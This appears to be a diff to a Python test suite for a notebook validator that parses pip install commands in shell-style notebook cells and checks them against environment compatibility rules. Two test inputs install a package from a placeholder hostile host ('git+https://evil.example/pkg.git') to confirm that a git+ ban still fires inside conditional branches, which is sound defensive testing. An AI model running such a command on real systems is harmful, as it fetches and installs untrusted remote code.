@@ -3444,13 +3444,22 @@ def test_a_compound_body_stays_conditional_past_its_separators():
     ] == [False, True, True]
 
 
-def test_a_dependency_the_cell_removes_is_reported():
+def test_a_dependency_the_cell_removes_is_reported(monkeypatch):
     """Uninstalling what a `--no-deps` install needs is the broken state the rule catches.
 
     `resolved_set` drops the removed package, and reading that as "no resolution data" made
     R-INST-005 and R-INST-002 fall silent on a strictly worse environment.
     """
     nv = _load_notebook_validator_module()
+    # Stubbed like the neighbouring rule tests: the live PyPI path makes this assert nothing
+    # at all wherever the network is blocked, which is a test that cannot fail.
+    monkeypatch.setattr(
+        nv,
+        "pypi_metadata",
+        lambda name, version: {"info": {"requires_dist": ["tokenizers (>=0.22.0,<=0.23.0)"]}}
+        if name.lower() == "transformers"
+        else None,
+    )
     colab = {
         "torch": "2.11.0+cu128",
         "python": "3.12",
@@ -3519,3 +3528,156 @@ def test_a_prerelease_sorts_below_the_abi_floor():
         )
         == []
     )
+
+
+def test_a_prefixed_pip_still_carries_the_and_chain():
+    """`_strip_exec_prefixes` reads words, so the notebook bang has to come off first.
+
+    With `!env` glued together no prefix name matched, `!env X=1 pip install ...` did not read
+    as pip, and the `&&` after it went conditional even though the install really runs.
+    """
+    nv = _load_notebook_validator_module()
+
+    assert nv._split_chained(
+        "!env X=1 pip install torchcodec==0.12.0 && pip install torch==2.10.0"
+    ) == [
+        ("!pip install torchcodec==0.12.0", False),
+        ("!pip install torch==2.10.0", False),
+    ]
+    assert nv._piece_is_pip("!env X=1 pip install a") is True
+    assert nv._piece_is_pip("!command pip install a") is True
+    # A prefixed non-pip command is still not pip, so it still ends the assumption.
+    assert nv._piece_is_pip("!env X=1 some_probe") is False
+
+
+def test_an_exec_bash_may_never_reach_hands_nothing_over():
+    """Replacement happens only when the `exec` command is actually executed.
+
+    The body condition lives in `body_levels`, not in the piece's own flag, so a hand-over
+    inside a compound body was declared unconditionally and dropped the reachable install
+    after the closer.
+    """
+    nv = _load_notebook_validator_module()
+
+    assert [
+        f.rule
+        for f in nv.rule_inst_001_git_plus(
+            "!if maybe; then echo before; exec true; fi; "
+            "pip install git+https://evil.example/pkg.git",
+            "nb.ipynb",
+            0,
+        )
+    ] == ["R-INST-001"]
+    # An unconditional exec still ends the list.
+    assert [
+        (inv.action, inv.packages)
+        for inv in nv.unconditional_pip_invocations(
+            "!exec pip install torch==2.11.0; pip install torch==2.12.0"
+        )
+    ] == [("install", ["torch==2.11.0"])]
+
+
+def test_a_substitution_inherits_the_body_condition():
+    """A substitution inside a body is expanded only when that body runs.
+
+    The recursion took the separator-level flag alone, so `if false; then echo $(pip install
+    ...); fi` recorded the inner install as certain and R-INST-004 judged a version bash never
+    installs.
+    """
+    nv = _load_notebook_validator_module()
+
+    assert [
+        flag
+        for _, flag in nv._split_chained("!if false; then echo $(pip install torch==2.10.0); fi")
+    ] == [False, True, True]
+    assert (
+        nv.rule_inst_004_torchcodec_torch(
+            "!if false; then echo $(pip install torch==2.10.0); fi",
+            COLAB_TORCH211,
+            "nb.ipynb",
+            0,
+        )
+        == []
+    )
+    # Outside a body the substitution is as certain as it ever was.
+    assert nv._split_chained("!echo $(pip install a)") == [
+        ("!pip install a", False),
+        ("!echo $(pip install a)", False),
+    ]
+
+
+def test_every_command_in_a_case_arm_is_conditional():
+    """An arm starts with a pattern, so no body keyword ever opens the level.
+
+    Only the piece carrying the arm label was flagged, and a later command in the same arm
+    replayed as certain even when the arm is not the one bash selects.
+    """
+    nv = _load_notebook_validator_module()
+
+    assert [
+        flag for _, flag in nv._split_chained("!case x in x) pip install a; pip install b; esac")
+    ] == [True, True]
+    # The level closes at `esac`, so what follows is judged again.
+    assert nv._split_chained("!case x in x) pip install a;; esac; pip install c") == [
+        ("!pip install a", True),
+        ("!pip install c", False),
+    ]
+
+
+def test_a_reinstall_undoes_a_removal():
+    """`pip uninstall x; pip install x` leaves x installed.
+
+    Answering on the first uninstall it met claimed the cell removes a dependency pip puts
+    straight back, so R-INST-002 and R-INST-005 reported a breakage that does not exist.
+    """
+    nv = _load_notebook_validator_module()
+
+    assert (
+        nv._removed_by_cell("!pip uninstall -y tokenizers\n!pip install tokenizers", "tokenizers")
+        is False
+    )
+    assert (
+        nv._removed_by_cell("!pip install tokenizers\n!pip uninstall -y tokenizers", "tokenizers")
+        is True
+    )
+    assert nv._removed_by_cell("!pip install transformers", "tokenizers") is False
+    # Underscores and dashes name the same project.
+    assert nv._removed_by_cell("!pip uninstall -y huggingface_hub", "huggingface-hub") is True
+
+
+def test_a_branching_parameter_expansion_is_conditional():
+    """`${name:-word}` expands its word on one branch of the parameter's state.
+
+    Verified locally: `READY=1; echo ${READY:-$(printf ...)}` never runs the substitution, so
+    recording the install inside it as certain invented a compatibility error.
+    """
+    nv = _load_notebook_validator_module()
+
+    assert [
+        flag for _, flag in nv._split_chained("!echo ${READY:-$(pip install torch==2.10.0)}")
+    ] == [True, False]
+    assert (
+        nv.rule_inst_004_torchcodec_torch(
+            "!READY=1; echo ${READY:-$(pip install torch==2.10.0)}",
+            COLAB_TORCH211,
+            "nb.ipynb",
+            0,
+        )
+        == []
+    )
+    # The git+ ban must still see it: it is a path the notebook may take.
+    assert [
+        f.rule
+        for f in nv.rule_inst_001_git_plus(
+            "!echo ${R:-$(pip install git+https://evil.example/pkg.git)}", "nb.ipynb", 0
+        )
+    ] == ["R-INST-001"]
+    # A plain expansion opens no branch, and an ordinary substitution is unchanged.
+    assert nv._split_chained("!echo ${HOME} $(pip install a)") == [
+        ("!pip install a", False),
+        ("!echo ${HOME} $(pip install a)", False),
+    ]
+    assert nv._substitution_bodies("echo $(pip install x) and `pip install y`") == [
+        "pip install x",
+        "pip install y",
+    ]
